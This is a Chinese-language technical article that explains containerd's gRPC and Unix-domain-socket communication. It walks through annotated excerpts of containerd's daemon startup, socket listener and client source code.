[{"content":"containerd通信机制 1 简述 Containerd 是一个云原生（容器）领域行业标准容器运行时。以操作系统守护进程方式提供服务，管理一台机器上每个容器生命周期，包括：\n镜像下载和存储。 容器 rootfs （根文件系统）的生成。 容器的启动和守护。 容器的低级存储和附加网络。 Containerd 是 CNCF 毕业项目，是 Kubernetes 和 Docker 的默认容器运行时。\nContainerd 守护进程默认提供了两套 API：\nContainerd 原生 GRPC API （源码），并提供了 Go SDK （参见：源码），Docker 以该方式集成 Containerd。 Kubernetes 的 CRI GRPC API（源码），形态上通过 Containerd Plugin 的方式提供服务（原生插件，打包到了 Containerd 二进制中），架构参见：docs。Kubernetes 以该方式集成 Containerd。 在底层容器运行时方面，Containerd 采用 OCI-runtime 标准，默认使用 runc 作为运行时。\n简单概述典型场景中 Kubernetes、Containerd、Runc 的 层级关系如下：\nKubernetes 负责集群（多节点）的调度和管理，在单个节点，通过 Kubelet 组件通过 CRI GRPC 接口调用 Containerd。 Containerd 提供单个节点的容器生命周期管理，包括镜像、存储、rootfs、网络，启动容器是 Containerd 通过 OCI-runtime 标准调用 runc。 Runc 容器引导器，负责根据一个容器的具体配置，在指定 rootfs 上引导启动一个容器进程。 2 gRPC框架原理 gRPC（Google Remote Procedure Call）是一个现代化、高性能的远程过程调用（RPC）框架，设计用于在分布式系统中实现跨网络、跨语言的服务调用。它利用了 HTTP/2 和 Protocol Buffers，为开发者提供了一种简便的方式来调用远程服务，就像调用本地函数一样。下面是 gRPC 的基本原理及其关键组件。\n2.1 gRPC 的工作流程 2.1.1 服务定义与接口生成 Protocol Buffers 定义服务: containerd 使用 Protocol Buffers（protobuf）来定义 gRPC 服务。这些服务接口和消息结构通常定义在 .proto 文件中。例如，containers.proto 文件定义了容器管理的服务接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 protobufCopy codesyntax = \u0026#34;proto3\u0026#34;; service Containers { rpc Create (CreateContainerRequest) returns (CreateContainerResponse); rpc Start (StartContainerRequest) returns (StartContainerResponse); rpc Stop (StopContainerRequest) returns (StopContainerResponse); } message CreateContainerRequest { string id = 1; // 其他字段... } message CreateContainerResponse { // 响应字段... } 生成客户端和服务端代码: 使用 protoc 编译器，.proto 文件会生成相应的客户端和服务端代码。对于 containerd，这些生成的代码是与 containerd 核心功能集成在一起的，客户端代码通常由外部工具或服务使用。\n2.1.2 gRPC 服务的实现 服务实现: containerd 中每个 gRPC 服务都有一个具体的实现，这些实现负责处理来自客户端的请求并执行相应的操作。服务的实现通常位于 containerd 的 services 目录中，下面是一个示例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 type containersServer struct { // 相关字段和依赖注入 } func (s *containersServer) Create(ctx context.Context, req *CreateContainerRequest) (*CreateContainerResponse, error) { // 实现容器创建逻辑 } func (s *containersServer) Start(ctx context.Context, req *StartContainerRequest) (*StartContainerResponse, error) { // 实现容器启动逻辑 } // 其他服务方法... 服务注册: 在 containerd 启动时，gRPC 服务器会启动并监听一个 Unix Domain Socket (UDS) 地址或 TCP 端口，然后将所有的服务注册到 gRPC 服务器中。\n1 2 3 grpcServer := grpc.NewServer() containerspb.RegisterContainersServer(grpcServer, \u0026amp;containersService) // 注册其他服务... 2.1.3 gRPC 通信机制 请求的发送与接收: 客户端通过生成的 gRPC 客户端代码向 containerd 发送请求。请求通过 gRPC 框架在客户端进行序列化（使用 Protocol Buffers），然后通过底层传输协议（通常是 HTTP/2 over Unix Domain Sockets）发送到 containerd。 服务器端处理: containerd 的 gRPC 服务器接收到请求后，将其反序列化为相应的消息对象，并调用对应服务的实现方法进行处理。处理完成后，响应结果再通过 gRPC 返回给客户端。 连接管理: gRPC 支持长连接，多个请求可以在同一个连接中并发进行。对于本地通信，containerd 通常使用 Unix Domain Sockets (UDS) 作为传输层，提升通信效率并增强安全性。 2.1.4 关键应用场景 客户端与 containerd 的通信: 外部客户端（如 ctr 工具或 Docker 引擎）通过 gRPC 与 containerd 进行通信，执行容器的创建、启动、停止、删除等操作。 containerd 插件的集成: 插件通过 gRPC 提供服务接口，containerd 核心通过调用这些接口来管理镜像、快照和容器运行时等。 containerd-shim 与 containerd 的通信: containerd-shim 进程负责管理每个容器的生命周期，与 containerd 核心通过 gRPC 通信来报告容器状态、接收管理命令等。 3 gRPC中使用UDS的场景 在 containerd 中，Unix Domain Sockets (UDS) 通信通常用于以下场景：\n3.1 containerd 守护进程与客户端之间的通信 场景: containerd 守护进程与外部客户端（如 ctr 工具或 Docker 引擎）之间的通信。 例子: 当 Docker 引擎需要与 containerd 交互时，它通过 gRPC 连接到 containerd 的 UDS 地址，如 /run/containerd/containerd.sock，以请求管理容器、镜像、快照等操作。 详细描述: containerd 启动时，会在配置的地址（通常是 /run/containerd/containerd.sock）上创建一个 UDS 监听器。 Docker 引擎或其他客户端通过 gRPC 连接到这个 UDS 地址来与 containerd 交互。 这种方式避免了网络开销，并限制了通信只能发生在本地主机上，提高了安全性。 3.2 containerd-shim 与 containerd 守护进程之间的通信 场景: 每个容器都有一个 containerd-shim 进程，containerd-shim 负责管理容器的生命周期，而 containerd-shim 与 containerd 守护进程之间的通信也是通过 UDS 实现的。 例子: 当 containerd 启动一个新的容器时，它会创建并启动一个对应的 containerd-shim 进程。containerd-shim 通过一个 UDS 与 containerd 进行通信，以报告容器的状态和接受命令。 详细描述: containerd-shim 进程会为每个容器创建一个 UDS，用于与 containerd 交互。 通过这个 UDS，containerd 可以向 containerd-shim 发送指令，如启动或停止容器，并接收来自 containerd-shim 的状态更新。 3.3 containerd 插件与外部服务的通信 场景: 某些插件可能作为外部服务运行，需要通过 UDS 与 containerd 通信。 例子: 一些外部存储插件可能独立运行并通过 UDS 暴露其 gRPC 服务，containerd 通过连接这个 UDS 来调用插件的服务。 详细描述: 插件可以在不同的进程中运行，通过 UDS 暴露其服务接口。 containerd 连接到这些 UDS 地址来与插件交互，执行诸如存储管理或网络管理等操作。 3.4 守护进程之间的通信 场景: 如果需要在多个守护进程（例如 containerd 和其他依赖服务）之间建立安全且高效的本地通信，可以使用 UDS。 例子: 在一些复杂的集群环境中，containerd 可能需要与其他守护进程（如 CRI-O、etcd 等）进行本地通信，这种情况下也可能使用 UDS。 详细描述: 多个守护进程在同一台主机上运行时，通过 UDS 通信，避免了使用 TCP/IP 带来的网络开销和安全风险。 4 containerd源码分析 4.1 containerd启动流程 文件路径：containerd/cmd/containerd/main.go，整个程序从这里开始启动，调用command.App()函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import ( \u0026#34;crypto\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/command\u0026#34; \u0026#34;github.com/containerd/containerd/v2/internal/hasher\u0026#34; _ \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/builtins\u0026#34; ) func init() { crypto.RegisterHash(crypto.SHA256, hasher.NewSHA256) } func main() { app := command.App() if err := app.Run(os.Args); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;containerd: %s\\n\u0026#34;, err) os.Exit(1) } } 文件路径：containerd/cmd/containerd/command/main.go，该文件主要用于实现 containerd 守护进程的启动和管理逻辑。该代码包括了如何初始化 containerd 守护进程、解析命令行参数、设置配置项，以及处理信号和服务终止。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 // App returns a *cli.App instance. func App() *cli.App { app := cli.NewApp() app.Name = \u0026#34;containerd\u0026#34; app.Version = version.Version app.Usage = usage app.Flags = append(app.Flags, serviceFlags()...) app.Commands = []*cli.Command{ configCommand, publishCommand, ociHook, } app.Action = func(cliContext *cli.Context) error { var ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) //···此处省略部分代码 if config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } // setup the ttrpc endpoint tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } // setup the main grpc endpoint l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) readyC := make(chan struct{}) go func() { server.Wait() close(readyC) }() return nil } return app } func serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } //···此处省略部分代码 详细分析（我只挑些重点的分析）：\n主逻辑 (app.Action)\napp.Action 中的主逻辑是 containerd 守护进程启动的核心部分。它包括初始化上下文、加载和应用配置、启动 gRPC 和 TTRPC 服务、信号处理，以及最终的服务启动和管理。以下是对主逻辑的详细分析：\n初始化\n1 2 3 4 5 6 7 8 var ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) defer cancel() 时间记录 (start): 记录守护进程启动的时间，用于后续日志记录启动耗时。\n信号通道 (signals): 创建一个缓冲区为 2048 的通道，用于接收系统信号，如 SIGTERM 或 SIGHUP，以便进行优雅的关闭操作。\n服务器通道 (serverC): 用于在异步初始化完成后传递 containerd 服务器实例。\n上下文 (ctx, cancel): 使用 context.WithCancel 创建一个可取消的上下文，确保在需要时能够取消所有与上下文关联的操作。\n配置 (config): 调用 defaultConfig() 函数创建一个默认配置对象，用于存储加载的配置选项。\n加载和应用配置\n1 2 3 4 5 6 7 configPath := cliContext.String(\u0026#34;config\u0026#34;) _, err := os.Stat(configPath) if !os.IsNotExist(err) || cliContext.IsSet(\u0026#34;config\u0026#34;) { if err := srvconfig.LoadConfig(ctx, configPath, config); err != nil { return err } } 配置文件路径: 从命令行参数中获取配置文件路径（configPath），默认情况下指向 /etc/containerd/config.toml 或其他默认路径。\n检查配置文件存在性: 使用 os.Stat 检查配置文件是否存在，或者用户是否明确指定了配置文件路径。如果存在或指定了路径，调用 srvconfig.LoadConfig 加载配置文件到 config 对象中。\n错误处理: 如果加载配置失败，立即返回错误并终止启动流程。\n确保必要配置存在\n1 2 3 4 5 6 7 8 if config.GRPC.Address == \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;grpc address cannot be empty: %w\u0026#34;, errdefs.ErrInvalidArgument) } if config.TTRPC.Address == \u0026#34;\u0026#34; { config.TTRPC.Address = config.GRPC.Address + \u0026#34;.ttrpc\u0026#34; config.TTRPC.UID = config.GRPC.UID config.TTRPC.GID = config.GRPC.GID } 验证 gRPC 地址: 确保 gRPC 服务的地址已在配置中设置。如果没有设置，则返回错误，因为 gRPC 地址是 containerd 服务的关键配置。 设置 TTRPC 地址: 如果 TTRPC 地址未配置，则使用 gRPC 地址附加 .ttrpc 作为默认地址，并复制 gRPC 的用户 ID 和组 ID 设置。 处理服务注册和信号\n1 2 3 4 5 6 7 8 9 10 stop, err := registerUnregisterService(config.Root) if err != nil { log.L.Fatal(err) } if stop { return nil } done := handleSignals(ctx, signals, serverC, cancel) signal.Notify(signals, handledSignals...) 服务注册/注销: 调用 registerUnregisterService 函数，处理 Windows 服务的注册或注销。如果处理完毕则终止程序（用于在 Windows 上操作服务控制管理器）。 信号处理: 调用 handleSignals 函数，设置信号处理器 done，用于处理来自系统的信号（如 SIGTERM、SIGINT）。然后调用 signal.Notify，将指定的信号注册到 signals 通道中，以便在接收到信号时触发相应的操作。 启动 containerd 服务器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 type srvResp struct { s *server.Server err error } chsrv := make(chan srvResp) go func() { defer close(chsrv) server, err := server.New(ctx, config) if err != nil { select { case chsrv \u0026lt;- srvResp{err: err}: case \u0026lt;-ctx.Done(): } return } if err := launchService(server, done); err != nil { log.L.Fatal(err) } select { case \u0026lt;-ctx.Done(): server.Stop() case chsrv \u0026lt;- srvResp{s: server}: } }() 异步初始化服务器: 使用 goroutine 异步初始化 containerd 服务器，避免在主线程中阻塞，例如在 Bolt 数据库初始化过程中。 创建 containerd 服务器: 调用 server.New 使用配置初始化 containerd 服务器实例。如果出现错误，通过 chsrv 通道返回错误并退出。 启动服务: 如果需要，调用 launchService 启动 containerd 服务器作为 Windows 服务（仅在 Windows 平台上）。 停止服务器: 监听 ctx.Done() 信号，当上下文被取消时，调用 server.Stop 停止服务器。 进一步分析server.New()函数，这个函数在containerd/cmd/containerd/server/server.go中。\n这个函数用于创建和初始化 gRPC 服务器的核心部分。它涉及配置的迁移、插件的加载与初始化、gRPC 服务的注册，以及其他服务器设置。（我这里只分析了部分重要源码）\n(1)配置迁移\n1 2 3 4 5 6 7 8 9 if currentVersion \u0026lt; version.ConfigVersion { // Migrate config to latest version t1 := time.Now() err := config.MigrateConfig(ctx) if err != nil { return nil, err } migrationT = time.Since(t1) } 版本检查与迁移：如果当前配置的版本低于系统要求的版本，则进行配置迁移。迁移时间被记录在 migrationT 中。\n配置迁移：通过 config.MigrateConfig(ctx) 方法进行迁移，将配置更新到最新版本。\n(2)配置 Stream 处理器\n1 2 3 for id, p := range config.StreamProcessors { diff.RegisterProcessor(diff.BinaryHandler(id, p.Returns, p.Accepts, p.Path, p.Args, p.Env)) } 注册流处理器：根据配置中的 StreamProcessors 注册流处理器，这些处理器用于处理数据流。 (3)、初始化 gRPC 服务器\n1 2 3 4 5 6 7 8 9 10 11 serverOpts := []grpc.ServerOption{ grpc.StatsHandler(otelgrpc.NewServerHandler()), grpc.ChainStreamInterceptor( streamNamespaceInterceptor, prometheusServerMetrics.StreamServerInterceptor(), ), grpc.ChainUnaryInterceptor( unaryNamespaceInterceptor, prometheusServerMetrics.UnaryServerInterceptor(), ), } gRPC 服务器选项：配置 gRPC 服务器的选项，如统计处理程序、拦截器等。这些拦截器可以用于处理命名空间、监控等。 (4)、注册服务\n1 2 3 4 5 for _, service := range grpcServices { if err := service.Register(grpcServer); err != nil { return nil, err } } 启动 gRPC 和其他服务（重点）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) 启动调试服务: 如果配置了调试地址，调用 serve 启动调试服务 (ServeDebug)。 启动度量服务: 如果配置了度量地址，调用 serve 启动度量服务 (ServeMetrics)。 启动 TTRPC 服务: 使用 sys.GetLocalListener 获取本地监听器并启动 TTRPC 服务 (ServeTTRPC)。 启动 gRPC 服务: 如果配置了 TCP gRPC 地址，则通过 TCP 启动 gRPC 服务 (ServeTCP)。同时，还会为主要的 gRPC 服务配置 Unix Domain Socket (UDS) 并启动服务 (ServeGRPC)。 服务启动与处理\nserve 函数用于启动指定的服务，接受一个监听器 l 和一个服务函数 serveFunc 作为参数。它在新的 goroutine 中执行服务函数，并在服务结束后关闭监听器。\n1 2 3 4 5 6 7 8 9 10 func serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } 在启动 gRPC 中调用了sys.GetLocalListener()，这个函数在下面的函数中被定义。\n文件路径：containerd/pkg/sys/socket_unix.go，这个文件涉及到了uds文件的创建。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package sys import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // CreateUnixSocket creates a unix socket and returns the listener func CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } // GetLocalListener returns a listener out of a unix socket. func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } func mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } 详细分析：\nCreateUnixSocket 函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 func CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } CreateUnixSocket 函数用于创建一个 Unix Domain Socket，并返回一个用于监听连接的 net.Listener 实例。\n详细分析：\n路径长度检查：首先，函数检查套接字路径的长度是否超过了 104 个字符。这是因为在一些 BSD 系统中，Unix Domain Socket 的路径长度限制为 104 个字符。如果路径太长，函数会返回一个错误。 创建父目录：使用 os.MkdirAll 创建 Unix Socket 的父目录。如果该目录不存在，MkdirAll 会递归地创建目录。目录权限设置为 0660。 删除现有的 Unix Socket 文件：调用 unix.Unlink 尝试删除指定路径上的现有文件（如果存在），以确保新创建的套接字文件不会与旧文件冲突。如果文件不存在，Unlink 会返回一个错误，但如果错误类型是 os.IsNotExist，表示文件本来就不存在，这时会忽略这个错误。 创建 Unix Socket：最后，使用 net.Listen(\u0026quot;unix\u0026quot;, path) 创建一个 Unix Domain Socket，并返回一个 net.Listener，供后续使用。 GetLocalListener 函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } GetLocalListener 函数用于创建一个本地的 Unix Domain Socket 监听器，并设置相应的权限和所有者信息。\n详细分析：\n创建父目录：调用 mkdirAs 函数确保 Unix Socket 的父目录已经创建，并设置了适当的用户 ID (uid) 和组 ID (gid)。 创建 Unix Socket：使用 CreateUnixSocket 函数创建 Unix Domain Socket。 设置权限：使用 os.Chmod 设置 Unix Socket 文件的权限为 0660，即文件所有者和组成员可读写，其他用户无权限。 设置所有者：使用 os.Chown 将 Unix Socket 文件的所有者和组设置为指定的 uid 和 gid。 返回监听器：如果所有操作都成功，返回创建的 net.Listener 实例。如果在过程中发生错误，关闭已创建的监听器，并返回错误信息。 mkdirAs 函数\n1 2 3 4 5 6 7 8 9 10 11 func mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } mkdirAs 函数用于创建指定的目录，并设置该目录的所有者和权限。\n详细分析：\n检查目录是否存在：使用 os.Stat 检查目标目录是否已经存在。如果目录存在，返回该目录的状态信息或错误。如果目录不存在，继续执行。 创建目录：使用 os.MkdirAll 创建目标目录，并将权限设置为 0770（即所有者和组成员可以读写执行，其他用户无权限）。 设置所有者：使用 os.Chown 将目录的所有者和组设置为指定的 uid 和 gid。 返回结果：如果所有操作都成功，返回 nil。如果任何步骤出错，则返回相应的错误信息。 4.2 client与containerd守护进程的通信 文件路径：containerd/client/client.go，这段代码是 containerd 项目中 client 包的实现，负责创建与 containerd 守护进程通信的客户端实例。它包含了与 containerd 进行 gRPC 通信的基础设施，提供了一组方法，用于与 containerd 的各种服务进行交互，例如容器管理、镜像管理、快照管理等。\nClient 结构体 1 2 3 4 5 6 7 8 9 type Client struct { services connMu sync.Mutex conn *grpc.ClientConn runtime string defaultns string platform platforms.MatchComparer connector func() (*grpc.ClientConn, error) } services: 内嵌的 services 结构体，包含了与 containerd 服务通信的具体方法，如 ContainerService、ImageService 等。 conn: 一个 gRPC 连接对象，用于与 containerd 守护进程通信。 connMu: 一个互斥锁，用于在多线程环境下保护 conn 对象的并发访问。 runtime: 表示当前使用的容器运行时。 defaultns: 客户端的默认命名空间。 platform: 平台匹配器，用于确定运行在特定平台上的容器。 connector: 一个函数，用于重新连接到 containerd 守护进程。 New 函数 New 函数用于创建一个新的 Client 实例，连接到指定的 containerd 守护进程地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 func New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) //gRPC连接 if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } 选项解析: copts 用于存储客户端配置选项，通过传入的 opts 进行解析配置。 默认配置设置: 如果未指定运行时、平台等选项，使用默认值进行初始化。 gRPC 连接: 配置了连接参数和拨号选项（如超时、TLS、安全凭证等）。 使用 grpc.NewClient 建立到 containerd 守护进程的 gRPC 连接。 连接成功后，保存连接对象 conn 和重新连接的函数 connector。 命名空间标签检查: 如果没有指定运行时，并且设置了默认命名空间，会尝试从命名空间标签中获取默认运行时。 错误处理: 如果无法建立 gRPC 连接，或未提供连接或服务，则返回错误。 NewWithConn 函数 NewWithConn 函数用于创建一个与现有的 gRPC 连接关联的 Client 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 func NewWithConn(conn *grpc.ClientConn, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } c := \u0026amp;Client{ defaultns: copts.defaultns, conn: conn, runtime: defaults.DefaultRuntime, } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } if copts.services != nil { c.services = *copts.services } return c, nil } 参数说明: conn: 一个现有的 gRPC 连接实例。 opts: 可选的客户端配置选项。 初始化: 与 New 函数类似，初始化 Client 实例，设置默认运行时和平台。 如果传入了服务配置 services，则使用该配置。 Reconnect 函数 Reconnect 函数用于重新建立与 containerd 守护进程的 gRPC 连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (c *Client) Reconnect() error { if c.connector == nil { return fmt.Errorf(\u0026#34;unable to reconnect to containerd, no connector available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Lock() defer c.connMu.Unlock() c.conn.Close() conn, err := c.connector() if err != nil { return err } c.conn = conn return nil } 锁定连接: 使用 connMu 互斥锁来防止并发修改 conn 对象。 关闭旧连接: 关闭现有的 gRPC 连接。 重新连接: 使用 connector 函数重新建立连接，并将新连接赋值给 conn。 IsServing 函数 IsServing 函数用于检查 containerd 守护进程是否正在运行，并返回 SERVING 状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 func (c *Client) IsServing(ctx context.Context) (bool, error) { c.connMu.Lock() if c.conn == nil { c.connMu.Unlock() return false, fmt.Errorf(\u0026#34;no grpc connection available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Unlock() r, err := c.HealthService().Check(ctx, \u0026amp;grpc_health_v1.HealthCheckRequest{}, grpc.WaitForReady(true)) if err != nil { return false, err } return r.Status == grpc_health_v1.HealthCheckResponse_SERVING, nil } 